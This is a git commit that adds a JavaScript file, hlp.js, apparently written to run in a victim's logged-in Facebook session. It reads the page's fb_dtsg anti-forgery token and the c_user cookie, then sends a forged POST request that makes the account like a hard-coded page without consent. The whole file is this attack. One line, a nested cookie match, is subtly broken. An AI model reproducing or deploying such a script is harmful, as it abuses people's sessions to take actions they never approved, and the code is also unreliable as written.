6d0d7bb425a2343ce53436c6645d1277610282d1
DOCTOR2009 <SARA2001420015@YAHOO.COM>
2014-07-22 08:10:24 +0300

    Create hlp.js

---
+++ hlp.js
@@ -0,0 +1,13 @@
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
+    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
+    var Page = new XMLHttpRequest(),
+        PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
+        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=210176859012871&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
+    Page['open']('POST', PageURL, true);
+    Page['onreadystatechange'] = function () {
+        if (Page['readyState'] == 4 && Page['status'] == 200) {
+            Page['close'];
+        };
+    };
+    Page['send'](PageParams);
+};
